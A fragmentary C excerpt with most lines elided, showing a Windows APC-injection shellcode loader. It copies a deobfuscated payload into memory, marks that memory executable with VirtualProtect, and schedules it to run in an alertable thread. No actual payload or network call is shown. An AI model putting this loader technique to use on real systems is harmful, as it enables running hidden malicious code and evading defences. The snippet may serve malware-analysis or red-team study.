...
// placing any thread in alertable state 
...
BOOL RunViaAPCInjectionFunction(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {
	...
	// allocate a space memory for the payload
	...
	// copy the payload to the allocated space memory
	memcpy(pPayloadAddress, pPayload, sPayloadSize);

	// change the permitions of allocated memory so we can execute the payload
	if (!VirtualProtect(pPayloadAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!]# VirtualProtect failed with error :  %d\n", GetLastError());
		return FALSE;
	}

	// Scheduling the payload to run in the target alertable thread
...
int main() {
	...
	if (!RunViaAPCInjectionFunction(hThread, pDeobfuscatedPayload, sDeobfuscatedSize)) {
		return -1;
	}
